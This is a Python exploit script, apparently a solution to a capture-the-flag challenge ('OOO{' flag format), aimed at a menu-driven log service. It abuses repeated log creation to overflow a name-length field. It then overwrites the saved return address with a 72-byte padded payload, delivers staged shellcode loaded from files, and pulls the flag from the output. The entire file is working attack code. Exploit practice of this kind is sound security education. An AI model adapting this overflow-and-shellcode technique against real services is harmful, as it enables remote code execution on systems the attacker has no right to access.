#!/usr/bin/env python3

import re
import struct
import sys
import logging

import nclib
from nclib import netcat

MENU_END = b'(4) Quit\n'

NEW_LOG = b'1'

WHAT_IS_NAME = b'What is the name of the log?'
WHAT_IS_CONTENT = b'What is the content of the log?'

"Second stage exploit"
def main():

    host = sys.argv[1]
    port = int(sys.argv[2])

    conn = netcat.Netcat((host, port), verbose=True)
    #conn = nclib.Process(host, verbose=True, echo_hex=False)
    result = conn.recvuntil(MENU_END)
    print(result)

    # Create four blank logs
    for _ in range(4):
        conn.sendline(NEW_LOG)
        result = conn.recvuntil(WHAT_IS_NAME)
        print(result)
        conn.sendline(b'n')
        result = conn.recvuntil(WHAT_IS_CONTENT)
        print(result)
        conn.sendline(b'c')
        result = conn.recvuntil(MENU_END)
        print(result)

    # Create the last log
    conn.sendline(NEW_LOG)
    conn.recvuntil(WHAT_IS_NAME)
    conn.sendline(b'x')
    conn.recvuntil(WHAT_IS_CONTENT)
    conn.sendline(b'a'*31)

    conn.recvuntil(MENU_END)

    # Create a log that will increase the size of the name field to the program
    conn.sendline(NEW_LOG)
    conn.recvuntil(WHAT_IS_NAME)
    conn.sendline(b'')
    conn.recvuntil(WHAT_IS_CONTENT)

    # we want to overflow the name_len so that it's very high
    payload = b'a'*7 + b'\x7f'*8

    conn.sendline(payload)

    conn.recvuntil(MENU_END)

    # Now, the next log can send a shitton for name and overflow saved eip

    conn.sendline(NEW_LOG)
    conn.recvuntil(WHAT_IS_NAME)

    size_buffer_to_sip = 72
    target_dest = 3888 - 8 - 72

    stage_0_shellcode = b""
    with open("read_in_shellcode", 'rb') as s:
        stage_0_shellcode = s.read()

    shellcode = b""
    with open("shellcode2", 'rb') as s:
        shellcode = s.read()


    # p = (b"a" * (size_buffer_to_sip - len(p)))

    # p += struct.pack('<q', target_dest)

    # try a different p to test things
    # p = stage_0_shellcode + (b'a'*(size_buffer_to_sip - len(stage_0_shellcode))) + struct.pack('<q', target_dest)
    p = b'a'*72 + struct.pack('<q', 3888) + stage_0_shellcode

    assert not b'\x0a' in p

    conn.sendline(p)

    # for _ in range(len(p)):
    #     conn.recvuntil('read')

    conn.recvuntil(WHAT_IS_CONTENT)

    conn.sendline(b'')

    # result = conn.recvuntil(b'Inst\n1012\n')
    # input()

    # while True:
    #     result = conn.recvuntil(b'Inst\n')
    #     input()

    shellcode_len = struct.pack('<B', len(shellcode))
    conn.send(shellcode_len + shellcode)
    conn.send(b'f'*2000)
    
    result = conn.recvall()
    flag = re.search(b'OOO{[^}]+}', result).group(0).decode('utf-8')

    print(f"FLAG: {flag}")

    sys.exit(0)


if __name__ == '__main__':
    main()
